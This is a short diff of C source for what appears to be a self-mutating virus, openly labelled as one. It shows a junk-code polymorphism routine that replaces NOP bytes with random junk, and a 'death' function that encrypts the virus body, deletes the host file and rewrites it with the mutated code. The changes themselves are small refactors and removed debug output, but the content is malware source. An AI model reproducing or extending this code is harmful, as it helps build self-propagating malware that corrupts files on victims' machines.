@@ -253,12 +253,6 @@ static void gen_junk(uint8_t *rdm_junk, int file_off) {
 
 static void replace_nop(uint8_t *self, int *junk_offsets) {
 
-	/* print offsets */
-	//for (size_t i = 0; i < g_nb_junk; i++) {
-	//	_printf(STR("Junk offset: %d\n"), junk_offsets[i]);
-	//}
-	//
-
 	for (size_t i = 0; i < g_nb_junk; i++) {
 
 		uint8_t rdm_junk[JUNK_LEN];
@@ -289,10 +283,11 @@ void prepare_mutate(void) {
 
 	make_writeable((uint8_t *)start, VIRUS_SIZE);
 
-	getrandom(g_rand, RAND_SIZE, 0); JUNK;
+	getrandom(g_rand, RAND_SIZE, 0);
 
-	if (g_junk_offsets[0] != 0)
+	if (g_junk_offsets[0] != 0) {
 		return;
+	}
 
 	fill_offsets((uint8_t *)start, VIRUS_SIZE, g_junk_offsets);
 }
@@ -327,13 +322,10 @@ int death(int start_offset, int64_t key, file_t *file) { JUNK;
 	if (is_encrypted) {
 		encrypt(entry, VIRUS_SIZE, key);
 		replace_nop(entry, g_junk_offsets);
+		encrypt(entry, VIRUS_SIZE, key);
 	} else {
 		write_self_pos(entry);
 		replace_nop(entry, g_junk_offsets);
-	}
-
-	if (is_encrypted) {
-		encrypt(entry, VIRUS_SIZE, key);
 	}
 
 	if (unlink(self_name) == -1) {
@@ -344,7 +336,6 @@ int death(int start_offset, int64_t key, file_t *file) { JUNK;
 	fd = open(self_name, O_CREAT | O_WRONLY | O_TRUNC, file->mode);
 	if (fd == -1)
 		return -1;
-
 
 	if (write(fd, self, file->view.size) == -1) {
 		close(fd);
